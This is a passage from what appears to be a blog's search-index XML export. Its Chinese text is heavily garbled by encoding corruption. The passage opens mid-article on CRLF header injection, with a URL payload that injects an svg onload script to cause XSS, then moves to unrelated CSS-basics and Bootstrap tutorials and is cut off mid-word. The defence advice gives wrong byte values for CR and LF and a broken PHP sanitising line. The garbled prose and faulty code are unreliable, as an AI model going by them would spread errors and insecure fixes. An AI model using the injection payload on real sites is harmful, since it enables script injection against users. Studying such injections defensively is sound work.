åˆ©ç”¨æ­¤ç¼ºé™·ï¼Œæ”»å‡»è€…èƒ½å¤Ÿä»»æ„æ·»åŠ ç”¨æˆ·ä»£ç†ï¼ˆuser-agentï¼‰ï¼Œreferers å’Œ cookiesã€‚å¦‚æœç«™ç‚¹1å’Œç«™ç‚¹2æ˜¯åŒä¸€å°æœåŠ¡å™¨ä¸Šçš„è™šæ‹Ÿä¸»æœºï¼Œå³ä½¿index.phpæœ‰é™åˆ¶ï¼Œæ”»å‡»è€…ä¹Ÿèƒ½ç»•è¿‡å…¶é™åˆ¶éæ³•è®¿é—®ç«™ç‚¹2ã€‚ è¿˜æœ‰ä¸€ä¸ªxssçš„èƒ½å¤Ÿè½»æ¾ç»•è¿‡filterçš„XSSï¼Œå¦‚æœæˆ‘ä»¬è¾“å…¥ï¼š http://www.xxx.com%0d%0a%0d%0a%3Csvg%2fonload%3dprompt%281%29%3E HTTP/1.1 200 ok Date: XXX Content-Type: text/html Content-Length: 154 Connection: close &lt;svg/onload=prompt(1)&gt; ä»è€Œå½¢æˆXSSæ¼æ´ 0x04 é˜²å¾¡ æ‚¨éœ€è¦é™åˆ¶ç”¨æˆ·è¾“å…¥CRï¼ˆ0x13ï¼‰å’ŒLFï¼ˆä¸º0x10ï¼‰æˆ–æ­£ç¡®ç¼–ç çš„è¾“å‡ºï¼Œä»¥é˜²æ­¢è‡ªå®šä¹‰HTTPæ ‡å¤´æ³¨å°„ã€‚ é€šè¿‡åœ¨PHPè„šæœ¬ä¸­åµŒå…¥å¦‚ä¸‹æŒ‡ä»¤ï¼Œç¡®ä¿æ‰€æœ‰è¿™ç§ç±»å‹çš„URLå˜é‡åœ¨ä½¿ç”¨æ—¶å·²è¢«æ¸…ç©ºï¼š $var = preg_replace(â€™///s+/â€™, â€™, $var); å¦‚æœä½ çš„è„šæœ¬ä¸éœ€è¦è®¿é—®URLsï¼Œå»ºè®®åœ¨php.iniä¸­å…³é—­allow_url_fopen]]></content>
      <tags>
        <tag>CRLF</tag>
        <tag>æ¸—é€æµ‹è¯•</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å‰ç«¯å¼€å‘åŸºç¡€çŸ¥è¯†]]></title>
    <url>%2F2016%2F08%2F29%2F%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%2F</url>
    <content type="text"><![CDATA[CSSç›’å­æ¨¡å‹ç½‘é¡µè®¾è®¡ä¸­å¸¸å¬çš„å±æ€§åï¼šå†…å®¹(content)ã€å¡«å……(padding)ã€è¾¹æ¡†(border)ã€è¾¹ç•Œ(margin)ï¼Œ CSSç›’å­æ¨¡å¼éƒ½å…·å¤‡è¿™äº›å±æ€§ã€‚ å…ƒç´ å®é™…å ç”¨å°ºå¯¸ = width(height) + padding + border + margin é€‰æ‹©å™¨CSS1 å®šä¹‰çš„é€‰æ‹©å™¨ å…ƒç´ é€‰æ‹©å™¨ï¼šE IDé€‰æ‹©å™¨ï¼š#id ç±»é€‰æ‹©å™¨ï¼šE.class åŒ…å«é€‰æ‹©å™¨ï¼šE F ä¼ªç±»é€‰æ‹©å™¨ï¼šE:linkã€E:visitedã€E:activeã€E:hoverã€E:focus ä¼ªå…ƒç´ ï¼šE:first-linkã€E:first-letter CSS2.1 å¢åŠ çš„é€‰æ‹©å™¨ é€šé…é€‰æ‹©å™¨ï¼š* (æ˜Ÿå·) ä¼ªç±»é€‰æ‹©å™¨ï¼šE:lang(fr) å­åŒ…å«é€‰æ‹©å™¨ï¼šE &gt; F ç›¸é‚»å…„å¼Ÿé€‰æ‹©å™¨ï¼šE + F ä¼ªå…ƒç´ ï¼šE:beforeã€E:after å±æ€§é€‰æ‹©å™¨ï¼šE[foo]ã€E[foo=â€barâ€]ã€E[foo~=â€barâ€]ã€E[foo|=â€barâ€] ä¼˜å…ˆçº§ â€»åŒçº§åæ¥å±…ä¸Š ä¾‹å¦‚ï¼š HTMLä»£ç ï¼š &lt;ul class=&quot;list&quot;&gt; &lt;li&gt;one&lt;/li&gt; &lt;li&gt;two&lt;/li&gt; &lt;li&gt;three&lt;/li&gt; &lt;/ul&gt; CSSä»£ç ï¼š ul li{color:#000;} 1 + 1 =2 .list li{color:#f00;} 10 + 1 =11 .list li çš„ä¼˜å…ˆçº§æ›´é«˜ï¼Œæ‰€ä»¥æµè§ˆå™¨ä¼šæ˜¾ç¤º .list li è®¾ç½®çš„æ ·å¼ å…¶å®è¯´ç™½äº†ï¼Œå°±æ˜¯åé¢çš„ä¼šæŠŠå‰é¢çš„è¦†ç›–æ‰ï¼Œå†…æ•›çš„ä¼šæŠŠlinkçš„è¦†ç›–æ‰ï¼Œç„¶åå†æ•´åˆã€‚ å¸ƒå±€æµ®åŠ¨ (float) noneï¼šä¸æµ®åŠ¨ï¼ˆé»˜è®¤å€¼ï¼‰ leftï¼šå·¦æµ®åŠ¨ rightï¼šå³æµ®åŠ¨ è§£é‡Šï¼š æµ®åŠ¨ä»€ä¹ˆæ„æ€å‘¢ï¼Œæ¯”å¦‚ï¼Œé»˜è®¤çš„ï¼Œæˆ‘ä»¬çŸ¥é“ï¼Œdivæ˜¯å æ»¡ä¸€è¡Œçš„ï¼Œç°åœ¨æˆ‘ä»¬æƒ³æŠŠä¸¤ä¸ªdivæ˜¾ç¤ºåœ¨ä¸€è¡Œä¸Šï¼Œé‚£æ€ä¹ˆåŠå‘¢ &lt;div style=&quot;width:100px;&quot;&gt;11111&lt;/div&gt;&lt;div style=&quot;width:150px&quot;&gt;2222&lt;/div&gt; è¿™æ ·æˆ‘ä»¬å°±è®¾ç½®äº†ä¸¤ä¸ªdivï¼Œä¸€ä¸ªå®½åº¦100px,ä¸€ä¸ªå®½150px,å¯é¢„è§ˆä¸€ä¸‹ï¼Œæˆ‘ä»¬çš„divä»åœ¨ä¸¤è¡Œä¸Šï¼Œé‚£ä¹ˆæ€ä¹ˆæŠŠå®ƒæ”¹åˆ°ä¸€è¡Œä¸Šå‘¢ï¼Œè¿™å„¿å°±éœ€è¦floatï¼Œè®¾ç½®ç¬¬ä¸€ä¸ªdivçš„floatä¸ºleft &lt;div style=&quot;width:100px;float:left;&quot;&gt;11111&lt;/div&gt;&lt;div style=&quot;width:150px&quot;&gt;2222&lt;/div&gt; å†é¢„è§ˆï¼Œå°±å¯ä»¥çœ‹åˆ°ï¼Œå®ƒä»¬åˆ°ä¸€è¡Œä¸Šäº†ã€‚ clearæ˜¯ä»€ä¹ˆæ„æ€å‘¢ï¼Œclearæ˜¯æ¸…é™¤çš„æ„æ€ï¼Œå®ƒæœ‰ä¸‰ä¸ªå€¼ï¼Œleft,right,both å¾ˆå¥½ç†è§£ï¼Œå¦‚æœè®¾ç½®äº†clear:leftï¼Œå®ƒå°±ä¸æ€•å®ƒçš„å·¦è¾¹æœ‰floatï¼ŒåŒç†clear:right,clear:bothï¼Œæ˜¯å·¦å³éƒ½ä¸è®©æœ‰float ä¸¾ä¸ªä¾‹å­ï¼Œè¿˜æ˜¯ä¸Šé¢çš„ æˆ‘ä»¬è®¾ç½®ç¬¬äºŒä¸ªdivçš„clear:left,ä¹Ÿå°±æ˜¯ä¸è®©å®ƒå·¦è¾¹æœ‰float &lt;div style=&quot;width:100px;float:left;&quot;&gt;11111&lt;/div&gt;&lt;div style=&quot;width:150px;clear:left;&quot;&gt;2222&lt;/div&gt; æˆ‘ä»¬é¢„è§ˆä¸€ä¸‹ï¼Œå°±å¯ä»¥çœ‹åˆ°ï¼Œå°½ç®¡ç¬¬ä¸€ä¸ªdivå·²ç»float:leftäº†ï¼Œè¿™ä¸¤ä¸ªdivä»ç„¶åœ¨ä¸¤è¡Œä¸Šï¼Œå°±æ˜¯ç”±äºç¬¬äºŒä¸ªdivä¸è®©å®ƒå·¦è¾¹æœ‰float å› ä¸ºcssçš„å®šä¹‰æ˜¯åé¢çš„å¯ä»¥è¦†ç›–å‰é¢çš„ï¼Œæ˜ç™½äº†å§ æ¸…æµ®åŠ¨-clear-bothHTMLä»£ç ï¼š &lt;div class=&quot;layout&quot;&gt; &lt;div class=&quot;left&quot;&gt;left&lt;/div&gt; &lt;div class=&quot;right&quot;&gt;right&lt;/div&gt; &lt;div class=&quot;clear&quot;&gt;&lt;/div&gt; &lt;/div&gt; CSSä»£ç ï¼š .layout{} .left{float:left} .right{float:right} .clear{clear:both} æ¸…æµ®åŠ¨-overflow:hiddenHTMLä»£ç ï¼š &lt;div class=&quot;layout&quot;&gt; &lt;div class=&quot;left&quot;&gt;left&lt;/div&gt; &lt;div class=&quot;right&quot;&gt;right&lt;/div&gt; &lt;/div&gt; CSSä»£ç ï¼š .layout{overflow:hidden;zoom:1;} .left{float:left} .right{float:right} å®šä½ (position) static-æ²¡æœ‰å®šä½ï¼ˆé»˜è®¤å€¼ï¼‰ relative-ç›¸å¯¹å®šä½ absolute-ç»å¯¹å®šä½ fixed-å›ºå®šå®šä½ å±‚çº§ å±‚çº§ (z-index) - åæ¥å±…ä¸Š å±‚çº§ (z-index) - å®šä½å…ƒç´ é«˜äºéå®šä½å…ƒç´  å±‚çº§ (z-index) - åŒä¸ºå®šä½å…ƒç´ åˆ™æ¯”è¾ƒ z-index éšè—ä¸æ˜¾ç¤º éšè—å…ƒç´ ï¼šdisplay:none;visibility:hidden; æ˜¾ç¤ºå…ƒç´ ï¼šdisplay:block;visibility:visible; â€» â€œdisplayâ€ åœ¨ å—çº§å…ƒç´ &amp;è¡Œå†…å…ƒç´  ä¸­å†è¯¦ç»†ä»‹ç» CSS Resethtml,body,div,ul,ol,li,dl,dt,dd,h1,h2,h3,h4,h5,h6,p,table,th,td,fieldset, form,input,button,textarea,hr,blockquote,pre{margin:0;padding:0;} h1,h2,h3,h4,h5,h6{font-size:100%; font-weight:bold;line-height:1em;} ul,ol,dl{list-style-type:none;} fieldset,img{border:none;} table{border-collapse:collapse;table-layout:fixed;empty-cells:show;} address,caption,cite,code,dfn,th{font-style:normal;font-weight:normal;} ins{text-decoration:underline;} del{text-decoration:line-through;} q:before,q:after{content:&quot;&quot;;} æ³¨æ„äº‹é¡¹ï¼š ä¸è¦ä½¿ç”¨ *{margin:0;padding:0;} æœ€2Bçš„ Resetï¼š div{float:left;} CSS ä¼˜åŒ–å±æ€§ç®€å†™-å¤–è¾¹è·margin:10px 15px 20px 25px; ä¸‹ ä¸Š å³ å·¦ é¡ºæ—¶é’ˆæ–¹å‘ margin:10px; ä¸Šä¸‹å·¦å³ç»Ÿä¸€è®¾ç½® margin:10px 15px; ä¸Šä¸‹ å·¦å³ å±æ€§ç®€å†™-å†…è¾¹è·padding:10px 15px 20px 25px; ä¸‹ ä¸Š å³ å·¦ ç®€å†™æ–¹å¼ä¸ margin ç›¸åŒ å±æ€§ç®€å†™-èƒŒæ™¯background:#ff0000 url(bg.jpg) no-repeat fixed top center; é¢œè‰² å›¾åƒ å¹³é“ºæ–¹å¼ æ»šåŠ¨æ–¹å¼ å›¾åƒå¼€å§‹ä½ç½® å¯ä»¥çœç•¥éƒ¨åˆ†å€¼ background:#f00; background:url(bg.jpg) no-repeat; å±æ€§ç®€å†™-è¾¹æ¡†border:1px solid #ff0000; å®½åº¦ æ ·å¼ é¢œè‰² å¯ä»¥çœç•¥éƒ¨åˆ†å€¼ border:solid #f00; border:1px solid; å±æ€§ç®€å†™-å­—ä½“font:italic bold 15px/20px &quot;å¾®è½¯é›…é»‘&quot; æ–œä½“ ç²—ä½“ å­—å·/è¡Œé«˜ å­—ä½“åç§° å­—å·ä¸å­—ä½“åç§°æ˜¯å¿…é¡»çš„ï¼Œå…¶ä»–å€¼å¯çœç•¥ font:15px â€œå¾®è½¯é›…é»‘â€; æ³¨æ„äº‹é¡¹ï¼š ç®€å†™ä¸­çœç•¥ä¸å†™çš„å±æ€§ï¼Œå°†ä½¿ç”¨é»˜è®¤å€¼ï¼Œè€Œä¸æ˜¯ç»§æ‰¿ã€‚ å±æ€§ç»§æ‰¿æ–‡æœ¬ç›¸å…³çš„æ ·å¼ä¼šç»§æ‰¿ åˆ—è¡¨ç›¸å…³çš„æ ·å¼ä¼šç»§æ‰¿ é¢œè‰²å±æ€§ä¼šç»§æ‰¿ é€‰æ‹©å™¨ä¼˜åŒ–ä»å³åˆ°å·¦çš„è§£æé¡ºåº body ul li a {color:#f00;} 4 3 2 1 é€‰æ‹©å™¨çš„æ•ˆç‡ â€»åœ¨ä¸€äº› JavaScript åº“ä¸­çš„é€‰æ‹©å™¨ï¼Œä¹Ÿé€‚ç”¨äºè¯¥æ•ˆç‡ã€‚ï¼ˆä¾‹å¦‚ï¼šjQueryï¼‰ å±æ€§ç»§æ‰¿ï¼Œå‡å°‘é€‰æ‹©å™¨ .box { padding:10px; } .box p { color:#333; } ç®€åŒ–ä¸ºï¼š .box { padding:10px ; color:#333; } ä¹¦å†™é¡ºåºæ˜¾ç¤ºå±æ€§ è‡ªèº«å±æ€§ æ–‡æœ¬å±æ€§ display top color visibility left font overflow width line-height position height text-align float margin text-decoration clear padding text-indent border text-transform outline vertical-align background white-space content æ ‡ç­¾&amp;è¯­ä¹‰ å—å…ƒç´ &amp;è¡Œå†…å…ƒç´ å—å…ƒç´  (block) div p h1~h6 ul ol li dl dt dd table form â€¦ è¡Œå†…å…ƒç´  (inline) span a img em strong select input textarea â€¦ è¡Œå†…å…ƒç´ æ— æ³•è®¾ç½®ä¸€äº›CSSå±æ€§ï¼Œä¾‹å¦‚ï¼š width, height, margin-top, margin-bottom, padding-top padding-bottom, text-index â€¦ â€»å¯ä»¥ä½¿ç”¨ display æ¥æ”¹å˜ display å¸¸ç”¨å±æ€§ å®Œæ•´å±æ€§æŸ¥é˜…ï¼šhttp://www.w3school.com.cn/css/pr_class_display.asp inline è®¾ç½®ä¸ºè¡Œå†…å…ƒç´  block è®¾ç½®ä¸ºå—å…ƒç´  inline-block è®¾ç½®ä¸ºè¡Œå†…å—å…ƒç´ * none å…ƒç´ ä¸ä¼šè¢«æ˜¾ç¤º åµŒå¥—è§„åˆ™ å—å…ƒç´ å†…èƒ½åŒ…å«æ‰€æœ‰è¡Œå†…å…ƒç´  è¡Œå†…å…ƒç´ ä¸èƒ½åŒ…å«å—å…ƒç´  ä»¥ä¸‹å—å…ƒç´ ä¸­ä¸èƒ½åŒ…å«å—å…ƒç´  h1~h6, p, dt, address HTML5 ç®€å•åº”ç”¨DocType &lt;!DOCTYPE HTML&gt; å­—ç¬¦é›† &lt;meta charset=&quot;utf-8&quot;&gt; å¤–é“¾ css æ–‡ä»¶ &lt;link rel=&quot;stylesheet&quot; href=â€œfilename.css&quot;&gt; å¤–é“¾ javascript æ–‡ä»¶ &lt;script src=â€œfilename.js&quot;&gt;&lt;/script&gt;]]></content>
      <tags>
        <tag>å‰ç«¯</tag>
        <tag>ç¼–ç¨‹</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BootStrapå­¦ä¹ ç¬”è®°]]></title>
    <url>%2F2016%2F08%2F29%2FBootStrap%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[BootStrapæ˜¯ä»€ä¹ˆBootStrapæ˜¯åŸºäºHTMLã€CSSå’ŒJavaScriptçš„æ¡†æ¶ï¼Œä½¿ä½ åªéœ€è¦å†™ç®€å•çš„ä»£ç å°±å¯ä»¥å¾ˆå¿«çš„æ­å»ºä¸€ä¸ªè¿˜ä¸é”™çš„å‰ç«¯ç•Œé¢ï¼Œå®ƒæ˜¯åç«¯ç¨‹åºå‘˜çš„ç¦éŸ³ï¼Œä½¿ä»–ä»¬åªéœ€è¦ä¸“æ³¨ä¸šåŠ¡é€»è¾‘ï¼Œè€Œæ— é¡»æµªè´¹å¤ªå¤šçš„ç²¾åŠ›åœ¨ç•Œé¢è®¾è®¡ä¸Šã€‚ å…¨å“åº” å®ƒå¯ä»¥å¼€å‘å…¨å“åº”å¼ç½‘é¡µâ€”â€”ä¸è®ºä½ ä½¿ç”¨æ‰‹æœºã€å¹³æ¿ç”µè„‘ã€æ™®é€šä¸ªäººç”µè„‘æµè§ˆç½‘ç«™å†…å®¹ï¼Œæ‰€æœ‰çš„å…ƒç´ éƒ½å¯ä»¥å¾ˆä¼˜é›…çš„å‘ˆç°ï¼Œå‡è½»äº†å› ä¸ºå…¼å®¹æ€§è€Œå¸¦æ¥çš„å·¥ä½œé‡ã€‚ ç‰ˆæœ¬ å®ƒçš„æœ€æ–°ç‰ˆæœ¬æ˜¯4.0ï¼Œå›½å†…ç›®å‰ç”¨çš„è¾ƒå¤šçš„æ˜¯3.x,æœ¬æ•™ç¨‹ä¹ŸåŸºäºBootStrap3.xç‰ˆæœ¬ã€‚ äºŒæ¬¡å¼€å‘ ä½ å¯ä»¥ä½¿ç”¨é»˜è®¤çš„BootStrapæ ·å¼ã€ç»„ä»¶å’Œæ’ä»¶ï¼Œä½ ä¹Ÿå¯ä»¥å¯¹å…¶è¿›è¡ŒäºŒæ¬¡å¼€å‘ï¼Œç”šè‡³ä½ è¿˜å¯ä»¥åŸºäºBootStrapç¯å¢ƒä½¿ç”¨è‡ªå·±å¼€å‘çš„ç»„ä»¶ã€‚ ä½ å¯ä»¥ç™»é™†http://v3.bootcss.comç‚¹å‡»é¡µé¢ä¸­çš„ä¸‹è½½BootStrapæŒ‰é’®ä¸‹è½½å®Œæ•´ç‰ˆã€‚ 1.é¦–å…ˆæŠŠå®ƒçš„æ–‡ä»¶æŒ‰ç…§ç±»åˆ«æ”¾åœ¨é¡¹ç›®çš„æ–‡ä»¶å¤¹ä¸­ ä½ å¯ä»¥æŠŠCSSæ–‡ä»¶â€”â€”bootstrap.min.cssæ”¾åœ¨ç±»ä¼¼stylesheetsè¿™æ ·ä¸“é—¨æ”¾CSSçš„æ–‡ä»¶å¤¹ã€‚æŠŠjsæ–‡ä»¶â€”â€”bootstrap.min.jsæ”¾åœ¨ç±»ä¼¼Scriptsæ–‡ä»¶å¤¹ä¸­ã€‚å½“ç„¶ï¼Œæœ€ç»ˆå¦‚ä½•éƒ¨ç½²å¯ä»¥æŒ‰ç…§ä½ çš„ä¸ªäººå–œå¥½ã€‚ 2.åœ¨é¡µé¢ä¸­ä½¿ç”¨BootStrap å°†BootStrapçš„æ–‡ä»¶bootstrap.min.cssã€bootstrap.min.jså¼•å…¥å½“å‰é¡µé¢ä¸­ï¼Œç”±äºBootStrapæ˜¯åŸºäºJqueryçš„ï¼Œæ‰€ä»¥åœ¨å¼•å…¥å®ƒçš„jsæ–‡ä»¶ä¹‹å‰ï¼Œä¸€å®šè¦å…ˆå¼•å…¥Jquery.jsã€‚æ³¨æ„ï¼šè¿™é‡Œè€ƒè™‘åˆ°æ–‡ä»¶å¤§å°ï¼Œæˆ‘ä»¬å¼•å…¥äº†minç‰ˆçš„æ–‡ä»¶ï¼Œå½“ç„¶ï¼Œä½ ä¹Ÿå¯ä»¥å¼•å…¥å®Œæ•´ç‰ˆçš„æ–‡ä»¶ã€‚ ç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š &lt;!-- Bootstrap æ ¸å¿ƒ CSS æ–‡ä»¶ --&gt;&lt;/p&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;/stylesheets/bootstrap.min.css&quot;&gt; &lt;!-- jQueryæ–‡ä»¶ --&gt; &lt;script src=&quot;/scripts/jquery.min.js&quot;&gt;&lt;/script&gt; &lt;!-- Bootstrap æ ¸å¿ƒ JavaScript æ–‡ä»¶ --&gt; &lt;p&gt;&lt;script src=&quot;/scripts/bootstrap.min.js&quot;&gt;&lt;/script&gt; BootStrapæ …æ ¼å¸ƒå±€BootStrapæ …æ ¼å¸ƒå±€æ˜¯çµæ´»ä½¿ç”¨BootStrapçš„åŸºç¡€ã€‚BootStrapå°†å±å¹•åˆ†ä¸º12ç­‰åˆ†ï¼Œåœ¨å…·ä½“çš„DIVä¸­ï¼Œå¯ä»¥é€šè¿‡è®¾ç½®DIVçš„æ‰€å ç­‰åˆ†çš„æ•°å­—ç¡®å®šå…¶åœ¨å±å¹•ä¸­å æœ‰çš„å®½åº¦ã€‚å¦‚ï¼š &lt;div class=&quot;rowâ€œ&gt;&lt;!--è¡¨ç¤ºå¦èµ·ä¸€è¡Œ--&gt; &lt;div class=&quot;col-md-8&quot; style=&quot;border:1px solid black;height:100px;&quot;&gt;&lt;/div&gt; &lt;div class=&quot;col-md-4&quot; style=&quot;border:1px solid black;height:100px;&quot;&gt;&lt;/div&gt; &lt;/div&gt; åœ¨ç¬¬ä¸€ä¸ªDIVä¸­class=&quot;col-md-8&quot;,ç¬¬äºŒä¸ªDIVä¸­class=&quot;col-md-4&quot;, å…¶ä¸­â€˜8â€™å’Œâ€˜4â€™å°±æ˜¯å…¶DIVæ‰€å å±å¹•å®½åº¦çš„æ•°å€¼ï¼ŒåŠ åœ¨ä¸€èµ·ç­‰äºâ€˜12â€™ã€‚ä¹Ÿå°±æ˜¯ç¬¬ä¸€ä¸ªDIVå æ•´ä¸ªå±å¹•å®½åº¦çš„â€˜8/12â€™,ç¬¬äºŒä¸ªDIVå â€˜4/12â€™ã€‚ æ³¨ï¼šåœ¨ä¸Šè¿°ä»£ç ä¸­ä¸ºäº†çªæ˜¾åŒºå—ï¼Œæˆ‘ä»¬è®¾ç½®äº†DIVçš„è¾¹æ¡†å®½åº¦ä¸º1åƒç´ é»‘è‰²å®çº¿ï¼Œé«˜åº¦è®¾ä¸º100åƒç´ ã€‚ å¸ƒå±€å±å¹•åˆ†ç±»BootStrapæ˜¯ä¸€ç§å…¨å“åº”çš„æŠ€æœ¯ï¼Œé‚£ä¹ˆé’ˆå¯¹ä¸åŒçš„å±å¹•ï¼Œå®ƒæ˜¯æ€ä¹ˆæä¾›æ”¯æŒçš„å‘¢ï¼Ÿ åˆ«æ‹…å¿ƒï¼Œé’ˆå¯¹ä¸åŒçš„æ˜¾ç¤ºå±å¹•å°ºå¯¸ï¼ŒBootStrapæä¾›äº†ä¸åŒçš„æ …æ ¼å¸ƒå±€çš„å±æ€§ï¼š col-xs-* è¶…å°å±å¹• æ‰‹æœº (&lt;768px) col-sm-* å°å±å¹• å¹³æ¿ (â‰¥768px) col-md-* ä¸­ç­‰å±å¹• æ¡Œé¢æ˜¾ç¤ºå™¨ (â‰¥992px) col-lg-* å¤§å±å¹• å¤§æ¡Œé¢æ˜¾ç¤ºå™¨ (â‰¥1200px) å¤šä¸ªå¸ƒå±€å±æ€§å¦‚æœæƒ³è®©ä¸€ä¸ªDIVåœ¨ä¸åŒçš„å±å¹•ä¸­å æœ‰ä¸åŒçš„å±å®½è¯¥æ€ä¹ˆåšå‘¢ï¼Ÿ BootStrapå…è®¸æˆ‘ä»¬åœ¨ä¸€ä¸ªDIVä¸­å†™å¤šä¸ªç±»åˆ«çš„å¸ƒå±€å±æ€§ï¼Œä»è€Œè®©è¯¥DIVåœ¨ä¸åŒçš„å±å¹•ä¸­å‘ˆç°ä¸åŒçš„å±å®½ã€‚å¦‚ï¼š &lt;div class=&quot;row&quot;&gt; &lt;div class=&quot;col-md-8 col-xs-6 col-lg-4&quot;&gt;&lt;/div&gt; &lt;/div&gt; è¯¥DIVåœ¨ä¸­ç­‰å±å¹•ä¸­å æœ‰â€˜8/12â€™ï¼Œåœ¨æ‰‹æœºä¸­å æœ‰â€˜6/12â€™ï¼Œåœ¨å¤§å±å¹•ä¸­å æœ‰å±å¹•æ¯”ä¾‹çš„â€˜4/12â€™ã€‚ ç½‘ç«™é¦–é¡µæ•´ä½“è®¾è®¡æ€è·¯æ•´ä½“æ¶æ„ä¸€èˆ¬è€Œè¨€é¦–é¡µè®¾è®¡å‡ ä¹ç­‰åŒä¸æ•´ä¸ªç½‘ç«™è®¾è®¡ï¼Œé‚£ä¹ˆé¦–é¡µä¸­åˆ°åº•åº”è¯¥æ”¾äº›ä»€ä¹ˆå†…å®¹æ‰å¥½å‘¢ï¼Ÿè¿™è¦çœ‹ç½‘ç«™æœ‰å“ªäº›ä¸»è¦çš„å…ƒç´ ã€‚æœ¬æ•™ç¨‹é‡Œè¦è®¾è®¡çš„ç½‘ç«™é¦–é¡µæ˜¯ä¸€ä¸ªå¤šç”¨æˆ·åšå®¢ç±»çš„ç½‘ç«™é¦–é¡µï¼Œåœ¨è¯¥ç½‘ç«™ä¸­ç”¨æˆ·å¯ä»¥å‘è¡¨åšå®¢ï¼Œä¹Ÿå¯ä»¥æ¨èå›¾ä¹¦ç»™å…¶ä»–ç”¨æˆ·ã€‚æ‰€ä»¥ï¼Œé¦–é¡µä¸­çš„æ¿å—åŒ…æ‹¬è¿™äº›åº”è¯¥æ˜¯æ°å½“çš„ï¼š æ•´ç«™å¯¼èˆªæ¡ æ–‡ç« ï¼ˆåšå®¢ï¼‰å±•ç¤ºæ¿å— å›¾ä¹¦å±•ç¤ºæ¿å— ç”¨æˆ·ï¼ˆä¼šå‘˜ï¼‰å±•ç¤ºæ¿å— è„šæ³¨â€”â€”footeréƒ¨åˆ† å…¶ä¸­å¯¼èˆªæ¡å’Œè„šæ³¨æ˜¯æ•´ä¸ªç½‘ç«™ä¸­éƒ½è¦ç”¨åˆ°çš„ï¼Œå…·ä½“å®ç°æ—¶å¯ä»¥æ”¾åœ¨å¸ƒå±€æ¨¡æ¿ä¸­ã€‚ æ¿å—åˆ’åˆ†æ ¹æ®ä¸Šé¢çš„æ•´ä½“æ¶æ„ï¼Œæˆ‘ä»¬å°†é¦–é¡µçš„æ¿å—åˆ†ä¸ºä»¥ä¸‹å‡ ä¸ªï¼š 1.æ–‡ç« æ¿å—â€”â€”å°†æœ€æ–°ã€æœ€çƒ­çš„æ–‡ç« ä»¥æ ‡ç­¾é¡µï¼ˆtabï¼‰åˆ‡æ¢æ–¹å¼æ”¾åœ¨è¯¥æ¨¡å—ä¸­ï¼Œä¸ºäº†é¡µé¢ç¾è§‚ï¼Œå°†æœ‰å›¾ç‰‡çš„æ–‡ç« çš„ç¬¬ä¸€ç« å›¾ç‰‡æ”¾åœ¨è½®æ¢å›¾ç‰‡ï¼ˆcaourselï¼‰æ’ä»¶ä¸­,æœ€å³ä¾§æ”¾ç½®çƒ­é—¨æ–‡ç« åˆ†ç±»ã€‚ 2.å›¾ä¹¦æ¿å—â€”â€”æŒ‰ç…§å›¾ä¹¦çš„åˆ†ç±»å°†å›¾ä¹¦æ”¾åœ¨é¦–é¡µä¸­ï¼Œç‚¹å‡»ä¸åŒçš„åˆ†ç±»åˆ‡æ¢åˆ°ä¸åŒçš„é€‰é¡¹å¡ã€‚å›¾ä¹¦å±•ç¤ºä½¿ç”¨è‡ªå·±å¼€å‘çš„Jquery Tabæ’ä»¶ï¼Œå¹¶å°†å…¶æ•´åˆåˆ°BootStrapç¯å¢ƒä¸­ã€‚æœ€å³ä¾§åŒæ ·æ˜¯å›¾ä¹¦çš„åˆ†ç±»ã€‚ 3.ç”¨æˆ·æ¿å—â€”â€”å°†æ–°åŠ å…¥çš„ç”¨æˆ·å’Œå¯¹ç¤¾åŒºè´¡çŒ®æœ€å¤šçš„ç”¨æˆ·æ”¾åœ¨é¦–é¡µä¸­ è¦ç”¨åˆ°çš„BootStrapå…ƒç´ é‚£ä¹ˆï¼Œæˆ‘ä¹ˆè¦ç”¨åˆ°å“ªäº›BootStrapå…ƒç´ æ‰èƒ½å¾ˆå¥½çš„å±•ç¤ºæˆ‘ä»¬çš„æ¿å—å†…å®¹å‘¢ï¼Ÿ 1.å¯¼èˆªæ¡ è¿™é‡Œè¦ç”¨åˆ°å›ºå®šåœ¨ç½‘é¡µå¤´éƒ¨çš„å¯¼èˆªæ¡ï¼ˆnavbar-fixed-topï¼‰,å¹¶åœ¨å…¶ä¸­æ•´åˆç”¨æˆ·ç™»å½•æ¨¡å—ï¼Œä»£ç å¦‚ä¸‹ &lt;div class=&quot;navbar navbar-inverse navbar-fixed-top&quot; role=&quot;navigation&quot;&gt; &lt;div class=&quot;container&quot;&gt; &lt;div class=&quot;navbar-header&quot;&gt; &lt;a class=&quot;navbar-brand active&quot; href=&quot;é¦–é¡µURL&quot;&gt;é¡¶æ±‚ç½‘&lt;/a&gt; &lt;a class=&quot;navbar-brand&quot; href=&quot;å›¾ä¹¦é¡µé¢URL&quot;&gt;å›¾ä¹¦&lt;/a&gt; &lt;a class=&quot;navbar-brand&quot; href=&quot;æ–‡ç« é¡µé¢URL&quot;&gt;æ–‡ç« &lt;/a&gt; &lt;/div&gt; &lt;div class=&quot;btn-group&quot; style=&quot;margin-top:10px; float:right;&quot;&gt; &lt;button type=&quot;button&quot; class=&quot;btn btn-default dropdown-toggle&quot; data-toggle=&quot;dropdown&quot;&gt; ä¼šå‘˜ç™»é™† &lt;span class=&quot;caret&quot;&gt;&lt;/span&gt; &lt;/button&gt; &lt;ul class=&quot;dropdown-menu&quot; role=&quot;menu&quot;&gt; &lt;LI&gt;&lt;a href=&quot;ä¼šå‘˜ç™»é™†é¡µé¢URL&quot; target=&quot;_top&quot;&gt;ä¼šå‘˜ç™»é™†&lt;/a&gt;&lt;/LI&gt; &lt;LI&gt;&lt;a href=&quot;ä¼šå‘˜æ³¨å†Œé¡µé¢URL&quot; target=&quot;_top&quot;&gt;ä¼šå‘˜æ³¨å†Œ&lt;/a&gt;&lt;/LI&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; 2.æ–‡ç« æ¿å—éœ€è¦ç”¨åˆ°çš„BootStrapå…ƒç´  1.è½®æ¢å›¾ç‰‡æ’ä»¶ï¼ˆcaoursel)â€”â€”è§£å†³äº†å±•ç¤ºå›¾ç‰‡æ—¶å›¾ç‰‡å˜å½¢çš„é—®é¢˜ã€‚ 2.æ 